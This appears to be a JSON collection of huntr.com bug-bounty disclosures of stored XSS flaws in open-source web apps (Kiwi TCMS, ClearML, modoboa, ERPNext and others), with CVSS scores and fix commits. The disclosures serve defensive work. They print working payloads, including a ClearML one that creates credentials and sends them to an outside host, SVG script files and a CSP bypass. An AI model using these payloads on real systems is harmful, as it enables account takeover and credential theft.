{"https://huntr.com/bounties/76737b3f-64f7-4212-a2e2-50bde28c1af0/": {"cve": "", "cve_link": "", "cwe": "CWE-79: Cross-site Scripting (XSS) - Stored", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "High (7.3)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nLow\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/frappe/erpnext", "fix_commit": "https://www.github.com/frappe/erpnext/commit/ff7c77e9fd0b8051b5309ded430c422aa0b89612", "description": "BUG\nstored xss via malicious file name\nVERSION\n14.41.1\nACCOUNT\n1. user-A --> Admin --> Victim\n2. user-B --> Normal user --> Attacker\nSTEP TO RERPODUCE\n1. from admin(user-A) account goto https://mytest.erpnext.com/app/user?enabled=1 and add a new user called \"user-B\" as normal role .\n\n2. Now admin goto https://mytest.erpnext.com/app/project?status=Open and create a new project called \"Project-A\" .\nAssign this project to user-B .\nSo,user-B can access this project-A\n\n3. Now goto user-B account and view the above project using url like https://mytest.erpnext.com/app/project/PROJ-0001 .\nHere user-B upload malicious filename like xss\" onmouseover=alert() aa=\".svg .This type filename can be created in linux.\nOr you can upload file https://github.com/ranjit-git/poc/blob/master/xss%22%20onmouseover%3Dalert()%20aa%3D%22.svg .DOnt change the filename after download\n\\ check image https://ibb.co/mN94QJp\n4. Now goto user-A account and open above project-A and mouseover over the attached file and xss will be executed\nImpact\nusing this bug lower level user can attack higher level user"}, "https://huntr.com/bounties/5f3fffac-0358-48e6-a500-81bac13e0e2b/": {"cve": "CVE-2023-6778", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-6778", "cwe": "CWE-79: Cross-site Scripting (XSS) - Stored", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "Medium (5.4)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nRequired\nScope\nChanged\nConfidentiality\nLow\nIntegrity\nLow\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/allegroai/clearml-server", "fix_commit": "https://www.github.com/allegroai/clearml-server/commit/4684fd5b74af582c894b67a0a06e865c948b763a", "description": "Description\nThe Markdown editor component, as used in both the Project Description and Reports sections, does not apply proper data sanitization. When unfiltered data is passed to this component, it allows for the injection of malicious XSS payloads. Specifically, this vulnerability exists in the Project Description and Reports sections, making them susceptible to stored XSS attacks.\nIn the case of the project description, after creating a project and putting its name and description, in the overview, the project description is directly passed in this line in /app/webapp-common/project-info/project-info.component.ts file:\nthis.info = project.description;\nthen rendered here:\n  <sm-markdown-editor\n    #editor\n    *ngIf=\"!loading\"\n    [class.editor]=\"editor.editMode\"\n    [data]=\"info\"\n    [readOnly]=\"example\"\n    (saveInfo)=\"saveInfo($event)\"\n  >\n    <div no-data class=\"flex-middle overview-placeholder\" *ngIf=\"!example\">\n      <i class=\"icon i-markdown xxl\"></i>\n      <div class=\"no-data-title\">THERE\u2019S NOTHING HERE YET\u2026</div>\n      <button (click)=\"editor.editClicked()\" class=\"no-data-button btn btn-neon\">\n        <span>ADD PROJECT OVERVIEW</span>\n      </button>\n    </div>\n  </sm-markdown-editor>\n</div>\nwithout any sanitization. This lack of sanitization allows attackers to craft and inject malicious XSS payloads into the project's description field.\nProof of Concept\nThe following video demonstrates the successful exploitation of this vulnerability, highlighting the generation of app credentials: POC\nHere is the used payload:\n<img src=x onerror=\"fetch('/api/v22.0/auth.create_credentials',{method:'POST',body: JSON.stringify({})}).then(function(r){return r.text()}).then(function(d){fetch('https://eocfpe5by1fjuzs.m.pipedream.net/',{method: 'POST', body: d})})\">\nImpact\nThis vulnerability has significant security implications, as it can lead to the compromise of user accounts and the manipulation of various critical functionalities within the application. The potential impacts of this vulnerability include:\n1.User Profile Manipulation: Attackers can exploit the stored XSS to modify the profile names of users within the application. This could lead to impersonation, identity theft, and confusion among users.\n2.Project Deletion: By using the XSS payload, an attacker can force a victim to delete their projects, potentially causing data loss and disruption in the application's functionality.\n3.App Credential Abuse (which was demonstrated in the POC video): The most severe consequence of this vulnerability is the ability to generate app credentials using the victim's account. App credentials often hold significant privileges within the application, allowing users to perform various administrative actions. With the compromised app credentials, an attacker could:\n-Create pipelines, which may lead to unauthorized data processing.\n-Connect ClearML agents, potentially compromising the integrity of machine learning operations.\n-Delete models, leading to potential data loss and system disruption.\n-Perform other actions with the same level of privilege as the victim, thus undermining the overall security and stability of the application."}, "https://huntr.com/bounties/511489dd-ba38-4806-9029-b28ab2830aa8/": {"cve": "", "cve_link": "", "cwe": "CWE-79: Cross-site Scripting (XSS) - Stored", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "High (8.1)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/kiwitcms/kiwi", "fix_commit": "https://www.github.com/kiwitcms/kiwi/commit/ffb00450be52fe11a82a2507632c2328cae4ec9d", "description": "Description\nUpload html file containing XSS payload.\nPayload '<img src=x onerror=alert(1)>`\nOn opening and refreshing the page, XSS payload executes in Firefox.\nProof of Concept\nhttps://drive.google.com/file/d/1Irkg0u-8Dc_EizRSN3xE87ezEWmp0L4j/view?usp=sharing\nImpact\nStored XSS vulnerabilities can lead to data theft, account compromise, and the distribution of malware. Attackers can inject malicious scripts into a website, allowing them to steal sensitive information or hijack user sessions. Additionally, stored XSS can result in website defacement and content manipulation, causing reputational damage. It can also be used as a platform for launching phishing attacks, tricking users into revealing their credentials or sensitive data."}, "https://huntr.com/bounties/c6eeb346-fa99-4d41-bc40-b68f8d689223/": {"cve": "", "cve_link": "", "cwe": "CWE-79: Cross-site Scripting (XSS) - Stored", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "High (8.1)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/kiwitcms/kiwi", "fix_commit": "https://www.github.com/kiwitcms/kiwi/commit/195ea53eaaf360c19227c864cc0fe58910032c3c", "description": "Description:\nThe application contains a stored XSS vulnerability, which allows an attacker to inject and execute malicious scripts within the application. The vulnerability occurs due to improper input validation and output encoding mechanisms, which fail to adequately sanitize and encode user-generated content.\nProof of Concept:\n1- Create a new test plan (e.g., \"plan1\") as a parent plan within the application.\n2- Create another test plan (e.g., \"plan2\"), specifically for uploading a payload. Utilize the \"Attachments\" feature of \"plan2\" to upload a file containing an XSS payload. Upon successful upload, a path will be generated for the uploaded file (e.g., \"http://localhost/uploads/attachments/testplans_testplan/2/xss.j\"). Make sure to copy this path for later use.\n3- Create a new test (e.g., \"plan3\") with the following name: <script src=/uploads/attachments/testplans_testplan/2/xss.js\"></script>. Additionally, specify the parent ID of \"plan3\" as the ID of \"plan1\" and save the test.\n4- Access the URL of \"plan1\" or \"plan3\" within the application.\n5- As a result of the vulnerability, the XSS payload injected through the test name will be executed within the application, potentially leading to malicious actions.\nPOC video: https://youtu.be/7_RxyZYcKxw\nImpact\nStored XSS (Cross-Site Scripting) vulnerability can have significant impacts on the security of a web application. In simple terms, it allows attackers to inject malicious code into the application's storage, which then gets displayed to other users visiting the affected page. This can lead to various harmful consequences, such as the execution of unauthorized actions on behalf of the user, stealing sensitive information like login credentials or personal data, manipulating website content, or even spreading phishing attacks. Essentially, it puts users at risk of having their browsers execute malicious scripts without their knowledge or consent, making it crucial to address this vulnerability promptly to ensure the safety of users and protect the integrity of the application."}, "https://huntr.com/bounties/6aea9a26-e29a-467b-aa5a-f767f0c2ec96/": {"cve": "", "cve_link": "", "cwe": "CWE-79: Cross-site Scripting (XSS) - Stored", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "High (8.1)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/kiwitcms/kiwi", "fix_commit": "https://www.github.com/kiwitcms/kiwi/commit/d789f4b51025de4f8c747c037d02e1b0da80b034", "description": "Description\nI've found a Stored XSS via uploading SVG file with the following content:\n<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"><defs><font id=\"x\"><font-face font-family=\"y\"/></font></defs></svg>\nProof of Concept\nhttps://drive.google.com/file/d/16HC08PPqAHZuubz-1IMJYZSETpTQZOzA/view?usp=sharing\nImpact\nStored XSS vulnerabilities can lead to data theft, account compromise, and the distribution of malware. Attackers can inject malicious scripts into a website, allowing them to steal sensitive information or hijack user sessions. Additionally, stored XSS can result in website defacement and content manipulation, causing reputational damage. It can also be used as a platform for launching phishing attacks, tricking users into revealing their credentials or sensitive data."}, "https://huntr.com/bounties/47f08086-aaae-4ca7-b0ca-24c616d3ad7d/": {"cve": "CVE-2023-2954", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-2954", "cwe": "CWE-79: Cross-site Scripting (XSS) - Stored", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "Medium (4.8)\nAttack vector\nNetwork\nAttack complexity\nHigh\nPrivileges required\nLow\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/liangliangyy/djangoblog", "fix_commit": "https://www.github.com/liangliangyy/djangoblog/commit/c2bfdb18c5f32b13ea4b50aa689b8ea4beb38719", "description": "Description\nRegister one account on blog, if account was actived, it can be comment.\nWe can commment with markdown.\nWhen another user clicks on the comment there may be an XSS alert.\nI git clone project and build with docker. Latest commit is: 07a1ded08eb4e0c6979f6aeebc35f3864ba250a7\n\nProof of Concept\nPayload:\n[a](javascript:prompt(document.cookie))\n[Basic](javascript:alert('xss'))\nPOST /article/1/postcomment HTTP/1.1\nHost: 192.168.125.133\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://192.168.125.133/article/2023/4/6/1.html\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 206\nOrigin: http://192.168.125.133\nConnection: close\nCookie: REMEMBERME=V2FsbGFiYWdcVXNlckJ1bmRsZVxFbnRpdHlcVXNlcjpkSFZoYm5SbzoxNzExODU2NTQ0Ojk4OTI2YTZkOWM1YmE2OTEzYTk5MzMzNWVjMjE3NWU2YjdkNzg5N2FmNWVkZjg4ZDZmMjBkZTg1ODMxNmM3YjU%3D; Hm_lvt_c790ac2bdc2f385757ecd0183206108d=1680331398; auth=%5B%22admin%22%2C%227676aaafb027c825bd9abab78b234070e702752f625b752e55e55b48e607e358%22%5D; csrftoken=OH2D3FHqNQqmFTVYnsIHXfheAaMZ3KnK; sessionid=kiqlg6int19jse966u7ozov5r1s2c9sh\nUpgrade-Insecure-Requests: 1\n\ncsrfmiddlewaretoken=Qihis6iSMnxK4jyE7zzlItn7EdQ7LrMCuP9LlBP8p3NWz2jskR7Svyub4dsWE1Zc&body=%5Ba%5D%28javascript%3Aprompt%28document.cookie%29%29&parent_comment_id=&submit=%E5%8F%91%E8%A1%A8%E8%AF%84%E8%AE%BA..\nOther user read blog and click on comment and a alert show\n\n\nOTHER\nBesides user-caused XSS on the comment function. I still see XSS case when admin add/edit a post, sidebar, category... When you add the payload code in the parameters when the user loads the site there will be XSS messages. For more information see second occurrences\nImpact\nXSS can cause serious issues. Attackers often leverage XSS to steal session cookies and impersonate the use"}, "https://huntr.com/bounties/cbc2676a-90ff-457f-9cdc-2a7981f960f3/": {"cve": "", "cve_link": "", "cwe": "CWE-79: Cross-site Scripting (XSS) - Stored", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "High (7.3)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/kiwitcms/kiwi", "fix_commit": "https://www.github.com/kiwitcms/kiwi/commit/e7833d68b9e391dc825139a249c608ab05c573c0", "description": "Description\nDuring the test, I discovered that the upload function accepted svg files without any sanitization, allowing me to inject javascript code into the svg file and store it, as well as execute the javascript code via the svg file.\nProof of Concept\n// PoC.js\nhttps://1drv.ms/v/s!AjTDEH9wRz1ugQ9VsCoWCdqX58BM?e=ng0UF3\nImpact\nI can run javascript code for any user on the site, authenticated or not, simply by sending the file, and the code will be executed, resulting in cookie theft and account takeover, creating a virus by javascript, such as a keylogger that logs everything the user types, or injecting script to mining on the victim's machine."}, "https://huntr.com/bounties/db75275f-8bcd-482b-ae12-feff660d4794/": {"cve": "", "cve_link": "", "cwe": "CWE-79: Cross-site Scripting (XSS) - Stored", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "High (8.1)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/kiwitcms/kiwi", "fix_commit": "https://www.github.com/kiwitcms/kiwi/commit/afc320f97b13a4c16e904cef54890edcc53db802", "description": "Description\nStored XSS, also known as persistent XSS, is the more damaging of the XSS. It occurs when a malicious script is injected directly into a vulnerable web application. Due to a sanitization problem it is possible to perform a Stored XSS. The problem is that the upload function permit malicious extensions like svg file. Due to this stored xss it is possible to become admin and perform other malicious actions using api endpoint.\nThe attack is easily executable by initially bypassing the regex that prevents script uploads, and finally the Content Security Policy.\nStep to Reproduce:\n1 - The Content Security Policy is script-src 'self' , so the first step will be to upload a \"test.js\" file via file upload, for example a simple alert(). 2 - Some security and regex checks are implemented to prevent material containing \"scripts\" from being uploaded. To bypass the regex checks, it is possible, for example, to upload an HTML file and use the tag <ScRipt, with some letters in uppercase. Any inline script will be blocked, but having previously created a \"test.js\" file containing some code, we can call that and it will run. A possible payload can be:\n<Script src='/uploads/tenant/public/attachments/testplans_testplan/7002/test.js'></Script>\nNow when an admin or other users will open the link, the XSS will be triggered.\nPOC Video:\nhttps://drive.google.com/file/d/1eSD2jnbAg6Ef_pJX3uM4J44ro82RLtaS/view?usp=share_link\nImpact\nStored XSS to run malicious javascript. Possibility to become admin and use also other api endpoint without permission."}, "https://huntr.com/bounties/f8c73bcc-02f3-4c65-a92b-1caa4d67c2fd/": {"cve": "", "cve_link": "", "cwe": "CWE-79: Cross-site Scripting (XSS) - Stored", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "Medium (6.8)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nLow\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/kiwitcms/kiwi", "fix_commit": "https://www.github.com/kiwitcms/kiwi/commit/6617cee0fb70cc394b7be6bbc86ef84e6e9de077", "description": "XSS Via SVG File Upload\nWhen uploading an image file to a bug report, you're able to upload .svg files which aren't properly sanitized before they are rendered, so any embedded Javascript will execute.\nSteps To Reproduce\n1. Create a bug report\n2. Upload a SVG attachment with a Javascript payload embedded. For example, you can use: \n\n<?xml version=\"1.0\" standalone=\"no\"?><!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"><svg onload=\"alert(1)\" xmlns=\"http://www.w3.org/2000/svg\"><defs><font id=\"x\"><font-face font-family=\"y\"/></font></defs></svg>\n\n3. Right-click the file & open it. Your Javascript will execute.\nMitigation\nhttps://github.com/kiwitcms/Kiwi/blob/master/tcms/rpc/api/user.py#L193\nBefore actually adding the attachment, check the file extension as well as sanitize the attachment data (EX: Such as stripping away Javascript embedded within .SVG files) before allowing it to be uploaded.\nImpact\nThe impact of this vulnerability is that a malicious user can upload a .SVG file with embedded Javascript which can execute on a victim's computer once they open the attachment in another tab. The embedded Javascript can be used to steal session cookies. This can also allow an attacker to use the Kiwi TCMS site to host their malicious .SVG payload and send a link to their uploaded attachment to victims."}, "https://huntr.com/bounties/bf99001b-a0a2-4f7d-98cd-983bc7f14a69/": {"cve": "", "cve_link": "", "cwe": "CWE-79: Cross-site Scripting (XSS) - Stored", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "High (8.8)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/kiwitcms/kiwi", "fix_commit": "https://www.github.com/kiwitcms/kiwi/commit/6617cee0fb70cc394b7be6bbc86ef84e6e9de077", "description": "Description\nStored XSS, also known as persistent XSS, is the more damaging of the XSS. It occurs when a malicious script is injected directly into a vulnerable web application. Due to a sanitization problem it is possible to perform a Stored XSS. The problem is that the upload function permit malicious extensions like svg file. Due to this stored xss it is possible to become admin problably, and perform other malicious actions using the api endpoint, I will try later on a local instance and I will let you know.\nNot sanitizing extensions could lead to more serious things, such as SSRF or RCE. I didn't test those, stopped as soon as I saw that you could upload SVG files.\nProof of Concept\n1 - Upload a malicous svg file and a link to the new file will be generated in the server.\nUpload this file (save the file with .svg extension):\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!-- Svg Vector Icons : http://www.onlinewebfonts.com/icon -->\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<svg version=\"1.1\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" x=\"0px\" y=\"0px\" viewBox=\"0 0 1000 1000\" enable-background=\"new 0 0 1000 1000\" xml:space=\"preserve\">\n<metadata> Svg Vector Icons : http://www.onlinewebfonts.com/icon </metadata>\n<g><g transform=\"translate(0.000000,511.000000) scale(0.100000,-0.100000)\"><path d=\"M974.7,3376.1c-105.3-28.7-212.5-120.6-260.3-222c-26.8-61.3-30.6-327.3-36.4-2894.1l-3.8-2829H387.1H100v-111v-109.1l250.7-197.1l250.7-195.2H5000h4398.5l250.8,195.2l250.7,197.1v109.1v111h-287.1h-287.1V206.5c0,1965.7-5.7,2802.2-21,2873c-28.7,135.9-139.7,254.6-271.8,294.8c-84.2,24.9-585.7,28.7-4031,26.8C1847.5,3401,1047.5,3395.3,974.7,3376.1z M8985.1,3062.2c21.1-21.1,24.9-553.2,24.9-2823.2v-2798.4l-1560-5.7l-1561.9-3.8l-34.5-67c-21-38.3-68.9-86.1-105.3-111c-67-42.1-78.5-42.1-748.4-42.1c-648.9,0-683.3,1.9-746.5,38.3c-36.4,23-84.2,72.7-105.3,111l-38.3,70.8H2557.7H1003.4l-9.6,61.3c-15.3,80.4-15.3,5443.6-1.9,5514.4c5.7,30.6,28.7,61.3,51.7,70.8c24.9,9.6,1770.5,15.3,3979.3,13.4C8223.3,3087.1,8964,3083.3,8985.1,3062.2z\"/><path d=\"M1296.3,2786.6c-5.7-13.4-7.7-1152.3-5.7-2532.3l5.7-2507.4H5000h3703.7V273.4V2800l-3699.9,5.7C2054.3,2809.6,1302,2805.7,1296.3,2786.6z M5415.4,2269.8c-3.8-13.4-157-409.6-340.7-880.5l-329.2-857.5h-84.2h-82.3l36.4,91.9c19.1,49.8,172.3,446,338.8,880.5l302.4,788.6h84.2C5400,2292.8,5423,2285.1,5415.4,2269.8z M4425.8,1833.4v-76.6l-482.3-241.2l-484.3-241.2l478.5-243.1l478.5-241.2l5.7-80.4c3.8-45.9,0-82.3-5.7-82.3s-266.1,130.2-576.1,290.9l-564.6,289l5.7,68.9l5.7,67l545.5,283.3c300.5,155,557,283.3,570.4,283.3C4416.2,1910,4425.8,1881.3,4425.8,1833.4z M6167.6,1628.6l555.1-283.3v-70.8v-68.9l-562.7-289c-310.1-158.9-570.4-289-576.1-289s-9.6,36.4-5.7,82.3l5.7,80.4l488.1,241.2l488.1,241.2l-491.9,245l-493.8,245v72.7c0,42.1,9.6,74.6,21,74.6C5604.8,1910,5863.2,1783.6,6167.6,1628.6z M4425.8,24.6v-86.1h-488.1h-488.1v86.1v86.1h488.1h488.1V24.6z M5245,30.4l-5.7-82.3l-157-5.7l-158.9-5.8v88.1v86.1H5088h162.7L5245,30.4z M6052.7,24.6v-88.1l-157,5.8l-158.9,5.7l-5.7,82.3l-5.7,80.4h162.7h164.6V24.6z M4100.4-300.8v-86.1H3775h-325.4v86.1v86.1H3775h325.4V-300.8z M5076.6-300.8v-86.1h-325.4h-325.4v86.1v86.1h325.4h325.4V-300.8z M5899.6-300.8v-86.1h-325.4h-325.4v86.1v86.1h325.4h325.4V-300.8z M6875.8-300.8v-86.1h-325.4H6225v86.1v86.1h325.4h325.4V-300.8z M4253.5-654.9v-76.6h-306.3H3641v76.6v76.6h306.2h306.3V-654.9z M4100.4-951.6v-86.1H3775h-325.4v86.1v86.1H3775h325.4V-951.6z M5076.6-951.6v-86.1h-239.3H4598v86.1v86.1h239.3h239.3V-951.6z M5076.6-1276.9v-86.1h-813.5h-813.5v86.1v86.1h813.5h813.5V-1276.9z M6225-1276.9v-86.1h-325.4h-325.4v86.1v86.1h325.4H6225V-1276.9z M5245-1606.2l5.7-82.3H4265h-987.7v72.7c0,40.2,5.7,80.4,13.4,86.1c5.7,7.7,447.9,11.5,980,9.6l968.5-5.7L5245-1606.2z M6550.4-1602.3v-86.1H6225h-325.4v86.1v86.1H6225h325.4V-1602.3z\"/></g></g>\n<script type=\"text/javascript\">\n     alert(document.cookie);\n   </script>\n</svg>\n2 - Insert something like that into a Test Plan:\n## ADMIN PLEASE OPEN THE LINK\n[!link](/uploads/attachments/testplans_testplan/2/Open.svg)\n![Open.svg](/uploads/attachments/testplans_testplan/2/Open.svg)\nNow when an admin or other users will open the link, the XSS will be triggered.\nPOC Video:\nhttps://drive.google.com/file/d/18y3-EJZMgpehIZufnlOxf8bqdRY5KK-3/view?usp=share_link\nImpact\nStored XSS to run malicious javascript. Probably possibility to become admin and use also other api endpoint without permission."}, "https://huntr.com/bounties/577c14f2-441b-4517-8a46-91f345842d38/": {"cve": "", "cve_link": "", "cwe": "CWE-79: Cross-site Scripting (XSS) - Stored", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "High (8)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/modoboa/modoboa-webmail", "fix_commit": "https://www.github.com/modoboa/modoboa-webmail/commit/3b3b3b703d50dc37a425eab1d9c3c5270c92ae01", "description": "Description\nThe XSS playload injected in \"Display Name\" parameter in creating Contacts are vulnerable to Cross-Site Scripting (Stored/Persistent).\nSteps to Reproduce:\n#1. First is go to the user dashboard then contacts: https://demo.modoboa.org/contacts/#/\n#2. Then Add new contact, enter the payload Bounty\"><script>alert(document.cookie);</script> in the Display Name as this field is not sanitized .\n#3. Next, go to webmail tab and compose a new email.\n#4. Lastly, type in the email address into \"to\" field, for this instance the email address is researcher.intigriti@gmail.com and then the stored XSS will get triggered.\n#5. Please refer the POC for the same.\nProof of Concept:\nDrive link of POC: https://drive.google.com/file/d/1AquPN4iQzVWVnQlrpsu9nQR3kh1ZBIee/view?usp=share_link\nPayload:\nBounty\"><script>alert(document.cookie);</script>\nRecommendations:\nRecommendation\n\u2022 Mark cookies as \"Secure\" and \"HTTP-Only\" where appropriate to minimize the impact of cross-site scripting attacks.\n\u2022 Before using any user-supplied data, validate its format and reject any characters that are not explicitly allowed (i.e. a white-list). This list should be as restrictive as possible.\n\u2022 Before using any data (stored or user-supplied) to generate web page content, escape all non alpha-numeric characters (i.e. output-validation). This is particularly important when the original source of data is beyond the control of the application. Even if the source of the data isn't performing input-validation, output-validation will still prevent XSS. This can be done by converting characters to \u201c&#nn;\u201d (ignore the quotes), where \u201cnn\u201d is the hexadecimal ASCII character number.\nMessage\nHi Ladies and Gents,\nI was hoping to receive and assign a CVE for the submitted vulnerability, please?\nThank you for your time.\nBest Regards,\nJeffrey\nImpact\nCross Site Scripting high severity issue allows a malicious user to stored malicious scripts on vulnerable page which when viewed by another user or administrator in the future would send session information or browser keystrokes to the attacker, allowing them to hijack or spy on the user's session."}, "https://huntr.com/bounties/cce6ed6c-3947-4749-bc12-21beee7dfabc/": {"cve": "", "cve_link": "", "cwe": "CWE-79: Cross-site Scripting (XSS) - Stored", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "Medium (5.5)\nAttack vector\nNetwork\nAttack complexity\nHigh\nPrivileges required\nLow\nUser interaction\nRequired\nScope\nChanged\nConfidentiality\nLow\nIntegrity\nLow\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/django-treebeard/django-treebeard", "fix_commit": "https://www.github.com/django-treebeard/django-treebeard/commit/f0e197bf7d98f127c3372ee174cc0c380f0fe42e", "description": "Description\nDjango-treebeard suffers from a stored XSS in the TreeAdmin class when certain preconditions are met. The XSS it's triggered when a privileged user visit a page in the django admin portal. In order to successfully exploit this vulnerable, three pre-conditions should occur:\n(1) a Django model subclasses AL_Node class from treebeard.al_tree\n(2) the Django model is registered to the admin panel using treebeard's TreeAdmin class\n(3) The attacker should be able to write data in a model field that returns in the __str__ method of the model.\nIn order to better understand the prerequisites, please follow the proof of concept below.\nProof of Concept\nIn order to re-create a vulnerable scenario, first create a model , called for example Project, that subclass AL_Node and returns a model's field in the __str__ method of the model :\n# models.py\nfrom django.db import models\nfrom treebeard.al_tree import AL_Node\n\n\nclass Project(AL_Node):\n    parent = models.ForeignKey('self',\n                               on_delete=models.CASCADE,\n                               related_name='children_set',\n                               verbose_name=('Father'),\n                               blank=True,\n                               null=True,\n                               db_index=True)\n    name = models.CharField(max_length=100)\n    node_order_by = ['name', ]\n\n    def __str__(self) -> str:\n        return self.name\nThen, register the model \"Project\" to the Django admin site using treebeard's TreeAdmin:\nfrom django.contrib import admin\nfrom core.models import Project \nfrom treebeard.admin import TreeAdmin\n\nadmin.site.register(Project, TreeAdmin)\nNow let's suppose an attacker is able to create a project with an arbitrary name, for example: <script>alert(1)</script> to it. Now, when an administrator visit the model list page in the Django admin site, the payload gets executed thus causing a stored XSS.\nThis stored appens due to improper sanitization appening on https://github.com/django-treebeard/django-treebeard/blob/70fd011f5a3bc7fe21653cbdba2c7d6e931aaec2/treebeard/templatetags/admin_tree_list.py#L27 , the str(node) parameter is in fact marked as safe when, in my opinion, it shouldn't as there is a chance it will contains user input.\nImpact\nIf successfully exploited , an attacker is able to inject arbitrary javascript code that gets stored in the database and executed when an administrator visit the list of entries of the affected model."}, "https://huntr.com/bounties/891ad0cb-d12f-4c5e-aac8-d7326caf2129/": {"cve": "CVE-2023-0519", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-0519", "cwe": "CWE-79: Cross-site Scripting (XSS) - Stored", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "High (7.1)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nChanged\nConfidentiality\nLow\nIntegrity\nLow\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/modoboa/modoboa", "fix_commit": "https://www.github.com/modoboa/modoboa/commit/eef9ab72b5305578a3ad7a7463bd284aa645e98b", "description": "Description\nThe XSS playload injected in the identities to create a new account leads to stored and reflected XSS in identities page and also in the logs page.\nSteps to Reproduce\n1. Go to admin/identities \n\n2.Enter the payload in the username, first name and last name as these fields are not sanatized \n\n3. This is the payload for triggering the XSS  \"><img src/onerror=prompt(8)>  and you can see payload executed in both the accounts page \n upon deletion action and the stored XSS will get triggered Logs page.\n\n4. Please refer the POC for the same.\nProof of Concept\nDrive link of POC\nhttps://drive.google.com/file/d/1glc2cwyrmi_IwicJ5SD5n0Wuhi82AtEW/view?usp=sharing\nImpact\nCross site scripting attacks can have devastating consequences. Code injected into a vulnerable application can exfiltrate data or install malware on the user\u2019s machine. Attackers can masquerade as authorized users via session cookies, allowing them to perform any action allowed by the user account."}, "https://huntr.com/bounties/4311d8d7-682c-4f2a-b92c-3f9f1a36255a/": {"cve": "CVE-2023-0488", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-0488", "cwe": "CWE-79: Cross-site Scripting (XSS) - Stored", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "Critical (9.6)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/pyload/pyload", "fix_commit": "https://www.github.com/pyload/pyload/commit/46d75a3087f3237d06530d55998938e2e2bda6bd", "description": "Description\n/collector page is vulnerable to stored XSS.\nPoC\nOpen the following file in the browser:\n<html>\n  <!-- CSRF PoC - generated by Burp Suite Professional -->\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    